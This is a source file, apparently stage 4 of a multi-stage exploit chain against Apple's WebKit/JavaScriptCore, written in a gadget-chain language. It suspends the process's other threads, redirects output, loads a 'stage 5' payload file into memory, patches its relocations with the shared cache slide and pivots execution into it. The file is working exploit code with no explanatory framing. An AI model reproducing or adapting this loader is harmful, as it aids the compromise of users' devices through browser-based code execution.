#include "config.h"
#include "config2.h"
extern __stderrp;
extern access;
extern close;
extern creat;
extern dup2;
extern exit [[noreturn]];
extern fprintf [[regparm = 2]];
extern lseek;
extern mach_task_self_;
extern mach_thread_self;
extern open;
extern pread;
extern task_threads;
extern thread_suspend;
extern unlink;
extern shared_cache_slide = 0; // XXX nasty trick to make the relocator store the slide here

#define	F_OK		0	/* test for existence of file */

/* open-only flags */
#define	O_RDONLY	0x0000		/* open for reading only */
#define	O_RDWR		0x0002		/* open for reading and writing */

#define	SEEK_END	2	/* set file offset to EOF plus offset */

/*
XXX upon entry, x0 points somewhere on the thread stack.  We need to switch
to a real stack, because JavaScriptCore does not like our mapped address...

WebKit/Source/JavaScriptCore/llint/LowLevelInterpreter.asm
    sanitizeStackForVMImpl() will test for VM::m_lastStackTop
WebKit/Source/WTF/wtf/StackBounds.cpp
    StackBounds::currentThreadStackBoundsInternal()
*/

thstack = [[stack=0x200]]__gadget_ret(); // internal gadget, returns x0

if !(access(STAGE4_FLAG, F_OK)) {
    unlink(STAGE4_NAME);
    while (1);
}

close(creat(STAGE4_FLAG, 420));

myth = mach_thread_self();
task_threads(*mach_task_self_, &thread_list, &thread_count);
while (thread_count) {
    oth = *thread_list & 0xffffffff;
    thread_list = thread_list + 4;
    thread_count = thread_count - 1;
    if (oth - myth) {
        thread_suspend(oth);
    }
}

fd2 = fd1 = open(STAGE4_FLAG, O_RDWR);
dup2(fd1, 1);
dup2(fd2, 2);

volatile fd = open(STAGE5_NAME, O_RDONLY);
volatile sz = lseek(fd, 0, SEEK_END);
volatile addr = (thstack - sz - 0x1000) & 0xFFFFFFFFFFFFC000;
fprintf(*__stderrp, "addr = %p\n", addr);
pread(fd, addr, sz, 0);
close(fd);

cur = addr + sz;
// external relocs
do {
    cur = cur - 8;
    g_off = *cur;
    g_dst_ptr = g_src_ptr = addr + g_off;
    *g_dst_ptr = *g_src_ptr + shared_cache_slide;
} while (g_off);
// local relocs
do {
    cur = cur - 8;
    l_off = *cur;
    l_dst_ptr = l_src_ptr = addr + l_off;
    *l_dst_ptr = *l_src_ptr + addr;
} while (l_off);

fprintf(*__stderrp, "jump to stage 5\n");
[[noreturn]]gadgets_pivot(__gadget_nop, addr);
